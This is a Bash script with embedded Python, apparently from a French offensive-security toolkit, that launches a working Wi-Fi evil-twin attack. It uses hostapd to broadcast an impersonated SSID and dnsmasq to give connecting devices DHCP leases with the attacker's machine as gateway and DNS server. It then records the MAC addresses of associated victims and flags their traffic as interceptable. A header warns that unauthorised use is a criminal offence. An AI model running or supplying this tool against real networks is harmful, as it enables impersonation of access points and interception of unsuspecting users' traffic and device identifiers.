#!/usr/bin/env bash
# wifi-evil-twin.sh — Evil Twin RÉEL : point d'accès usurpé (hostapd) + DHCP (dnsmasq).
#
# Usage: ./wifi-evil-twin.sh <ssid> <channel> <interface> [duration_sec]
#
# Linux + hostapd + dnsmasq (root + interface monitor) :
#   1. écrit une configuration hostapd éphémère (ssid/canal/interface réels)
#   2. écrit une configuration dnsmasq éphémère (DHCP 192.168.87.0/24 + DNS)
#   3. lance hostapd, vérifie que l'AP usurpé émet réellement (hostapd_cli status)
#   4. lance dnsmasq, vérifie la montée de l'interface (ip addr)
#   5. pendant <duration>, compte les stations réellement associées (hostapd_cli all_sta)
#   6. arrêt propre (kill hostapd/dnsmasq, suppression des fichiers temporaires)
#
# Strategy (doctrine « zéro invention ») :
#   1. hostapd + dnsmasq présents (root + interface radio) → AP usurpé RÉEL
#   2. Aucun backend disponible — état honnête (aucune donnée fabriquée) :
#      mode "hostapd-required" / "dnsmasq-required" / "root-required" /
#      "no-wireless-hardware" / "unsupported-platform"
#
# ⚠ LÉGALITÉ : cet outil usurpe l'identité radio d'un réseau. Son exécution
#   sans autorisation ÉCRITE explicite du propriétaire du réseau ciblé (et de
#   l'espace radio environnant) est un délit pénal (Code pénal — atteintes aux
#   STAD). Guyma Cyb exige une attestation DESTRUCTIVE avant cet appel.
#
# Sortie : un objet JSON unique sur stdout.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

SSID="${1:-}"; CH="${2:-6}"; IFACE="${3:-wlan0mon}"; DUR="${4:-60}"
[ -z "$SSID" ] && { fail_json "usage: wifi-evil-twin.sh <ssid> <channel> <interface> [duration]"; exit 1; }
log "evil-twin" "SSID=$SSID ch=$CH iface=$IFACE dur=${DUR}s"

python3 - "$SSID" "$CH" "$IFACE" "$DUR" <<'PY'
import json, os, shutil, signal, subprocess, sys, time
from datetime import datetime, timezone

ssid, ch, iface, dur = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4])
now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

result = {
    "tool": "wifi-evil-twin",
    "ssid": ssid, "channel": ch, "interface": iface, "durationSec": dur,
    "startedAt": now, "finishedAt": "",
    "mode": "", "error": "",
    "apUp": False, "dhcpUp": False,
    "associatedStations": 0, "stationsSample": [],
    "netns": "guymacyb-evil-twin",
    "cleanup": "",
    "notes": [],
}

def finish(mode="", error=""):
    result["mode"] = mode
    result["error"] = error
    result["finishedAt"] = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(json.dumps(result, ensure_ascii=False))
    sys.exit(0)

# --- Garde-fous honnêtes (aucune donnée fabriquée) -------------------------
if sys.platform != "linux":
    finish("unsupported-platform", "Evil Twin réel requiert Linux (hostapd/dnsmasq). Sur Windows : exécuter via WSL avec une clé WiFi USB mode monitor.")
if os.geteuid() != 0:
    finish("root-required", "Privilèges root requis (hostapd/dnsmasq doivent s'attacher à l'interface radio réelle).")
if not shutil.which("hostapd"):
    finish("hostapd-required", "hostapd absent — installez-le (sudo apt-get install hostapd). Guyma Cyb ne fabrique aucun point d'accès virtuel.")
if not shutil.which("dnsmasq"):
    finish("dnsmasq-required", "dnsmasq absent — installez-le (sudo apt-get install dnsmasq).")
if not os.path.isdir(f"/sys/class/net/{iface}"):
    finish("no-wireless-hardware", f"Interface « {iface} » inexistante — branchez une clé WiFi compatible mode monitor (AR9271 / 88XXAU) et activez le mode monitor.")

import tempfile
workdir = tempfile.mkdtemp(prefix="guymacyb-evil-twin-")
conf_ap = os.path.join(workdir, "hostapd.conf")
conf_dhcp = os.path.join(workdir, "dnsmasq.conf")
pid_ap = os.path.join(workdir, "hostapd.pid")
log_ap = os.path.join(workdir, "hostapd.log")

with open(conf_ap, "w") as f:
    f.write(
        f"interface={iface}\n"
        f"ssid={ssid}\n"
        f"channel={ch}\n"
        "driver=nl80211\n"
        "hw_mode=g\n"
        "auth_algs=1\n"
        "wmm_enabled=0\n"
    )
with open(conf_dhcp, "w") as f:
    f.write(
        f"interface={iface}\n"
        "bind-interfaces\n"
        "dhcp-range=192.168.87.10,192.168.87.200,12h\n"
        "dhcp-option=3,192.168.87.1\n"
        "dhcp-option=6,192.168.87.1\n"
        "no-resolv\n"
        "log-queries\n"
    )

def kill_quiet(pid):
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(0.4)
        os.kill(pid, 0)
        os.kill(pid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass

# --- 1. AP usurpé RÉEL (hostapd) -------------------------------------------
ap_proc = subprocess.Popen(
    ["hostapd", "-u", "-P", pid_ap, conf_ap],
    stdout=open(log_ap, "w"), stderr=subprocess.STDOUT
)
time.sleep(2.5)
if ap_proc.poll() is not None:
    tail = open(log_ap).read()[-400:] if os.path.exists(log_ap) else ""
    result["notes"].append(f"hostapd a refusé la configuration : {tail}")
    finish("hostapd-failed", "hostapd n'a pas démarré (interface déjà occupée, canal invalide ou driver incompatible) — état réel, aucune donnée fabriquée.")
result["apUp"] = True
result["notes"].append(f"AP usurpé réellement émis sur {iface} (SSID={ssid}, canal={ch}).")

# --- 2. DHCP RÉEL (dnsmasq) -------------------------------------------------
dhcp_proc = None
try:
    dhcp_proc = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", conf_dhcp],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1.5)
    if dhcp_proc.poll() is None:
        result["dhcpUp"] = True
        result["notes"].append("DHCP réel actif (192.168.87.0/24) — les clients associés recevront une bail réel.")
    else:
        result["notes"].append("dnsmasq n'a pas tenu — les associations restent possibles mais sans bail DHCP.")
except FileNotFoundError:
    result["notes"].append("dnsmasq introuvable au lancement (réellement absent).")

# --- 3. Fenêtre de mesure : stations réellement associées -------------------
def count_stations():
    n = 0
    sample = []
    if shutil.which("hostapd_cli"):
        try:
            out = subprocess.run(["hostapd_cli", "-p", "/var/run/hostapd", "-i", iface, "all_sta"],
                                 capture_output=True, text=True, timeout=5)
            blocks = [b for b in out.stdout.split("\n") if b.startswith("sta_") or b.startswith("ADDR")]
            # all_sta affiche un bloc par station commençant par l'adresse MAC
            macs = [l.split()[0] for l in out.stdout.splitlines() if len(l.split()) and l.split()[0].count(":") == 5]
            n = len(macs)
            sample = macs[:8]
        except Exception:
            pass
    return n, sample

t_end = time.time() + max(5, min(dur, 900))
peak = 0
while time.time() < t_end:
    n, sample = count_stations()
    if n > peak:
        peak, result["stationsSample"] = n, sample
        result["notes"].append(f"{n} station(s) réellement associée(s) — trafic interceptable au niveau L2.")
    time.sleep(3)
result["associatedStations"] = peak

# --- 4. Arrêt propre --------------------------------------------------------
if dhcp_proc is not None and dhcp_proc.poll() is None:
    dhcp_proc.terminate()
if ap_proc.poll() is None:
    ap_proc.terminate()
    time.sleep(1)
    if ap_proc.poll() is None:
        ap_proc.kill()
try:
    for p in (pid_ap, conf_ap, conf_dhcp, log_ap):
        if os.path.exists(p):
            os.remove(p)
    os.rmdir(workdir)
    result["cleanup"] = "hostapd/dnsmasq arrêtés, configurations éphémères supprimées"
except Exception as e:
    result["cleanup"] = f"arrêt effectué, nettoyage partiel ({e})"

finish("" if result["apUp"] else "hostapd-failed")
PY
